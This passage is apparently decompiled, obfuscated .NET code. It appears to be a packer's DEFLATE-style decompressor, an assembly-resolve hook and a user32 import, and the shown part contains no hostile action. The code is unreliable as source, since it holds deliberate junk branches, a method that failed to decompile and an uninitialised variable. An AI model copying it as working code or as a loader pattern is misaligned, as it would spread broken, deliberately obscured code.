          break;
        case 3:
          if ((obj0.\u0005 = \u000F.\u0001(obj0.\u0001, 16)) >= 0)
          {
            \u000F.\u0001(obj0.\u0001, 16);
            goto label_18;
          }
          else
            goto label_15;
        case 4:
label_19:
          *(int*) ((IntPtr) voidPtr + 4) = \u000F.\u0001(obj0.\u0001, 16);
          int num1 = *(int*) ((IntPtr) voidPtr + 4);
          if (false)
            return num1 != 0;
          if (num1 < 0)
          {
            if (true)
              return false;
            goto case 3;
          }
          else
            goto label_23;
        case 5:
label_24:
          *(int*) ((IntPtr) voidPtr + 8) = \u000F.\u0001(obj0.\u0001, obj0.\u0001, obj0.\u0005);
          obj0.\u0005 -= *(int*) ((IntPtr) voidPtr + 8);
          if (obj0.\u0005 != 0)
            return !\u000F.\u0001(obj0.\u0001);
          obj0.\u0001 = 2;
          if (true)
            return true;
          break;
        case 6:
          if (!\u000F.\u0001(obj0.\u0001, obj0.\u0001))
            return false;
          obj0.\u0001 = \u000F.\u0001(obj0.\u0001);
          obj0.\u0002 = \u000F.\u0001(obj0.\u0001);
          obj0.\u0001 = 7;
          goto case 7;
        case 7:
        case 8:
        case 9:
        case 10:
          return \u000F.\u0001(obj0);
        case 12:
          return false;
        default:
          return false;
      }
      \u000F.\u0001(obj0.\u0001, 3);
      if ((*(int*) voidPtr & 1) != 0)
        obj0.\u0001 = true;
      int num2 = *(int*) voidPtr;
label_6:
      switch (num2 >> 1)
      {
        case 0:
          \u000F.\u0001(obj0.\u0001);
          obj0.\u0001 = 3;
          break;
        case 1:
          obj0.\u0001 = \u0005.\u0004.\u0001;
          obj0.\u0002 = \u0005.\u0004.\u0002;
          obj0.\u0001 = 7;
          if (true)
          {
            if (true)
            {
              if (false)
                goto label_23;
              else
                break;
            }
            else
              goto label_15;
          }
          else
            goto label_18;
        case 2:
          obj0.\u0001 = new \u0005.\u0005();
          obj0.\u0001 = 6;
          break;
      }
      return true;
label_15:
      int num3 = 0;
      if (num3 == 0)
        return num3 != 0;
      num2 = num3;
      goto label_6;
label_18:
      obj0.\u0001 = 4;
      goto label_19;
label_23:
      \u000F.\u0001(obj0.\u0001, 16);
      obj0.\u0001 = 5;
      goto label_24;
    }

    static void \u0001()
    {
      // ISSUE: unable to decompile the method.
    }

    static void \u0001([In] int obj0, [In] int obj1, [In] byte[] obj2, [In] \u0005.\u0002 obj3)
    {
      if (true)
        goto label_6;
label_4:
      obj3.\u0003 += 8;
label_5:
      obj3.\u0001 = obj2;
      obj3.\u0001 = obj1;
      int num;
      obj3.\u0002 = num;
      return;
label_6:
      if (obj3.\u0001 < obj3.\u0002)
        throw new InvalidOperationException();
      num = obj1 + obj0;
      if (0 > obj1 || obj1 > num || num > obj2.Length)
        throw new ArgumentOutOfRangeException();
      if ((obj0 & 1) != 0)
      {
        obj3.\u0001 |= (uint) (((int) obj2[obj1++] & (int) byte.MaxValue) << obj3.\u0003);
        goto label_4;
      }
      else
        goto label_5;
    }

    static void \u0001()
    {
      try
      {
        AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u000F.\u0001);
      }
      catch
      {
      }
    }

    [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001([In] int obj0);

    static \u000F() => \u0006.\u0006.\u0001(typeof (\u000F));
  }
}
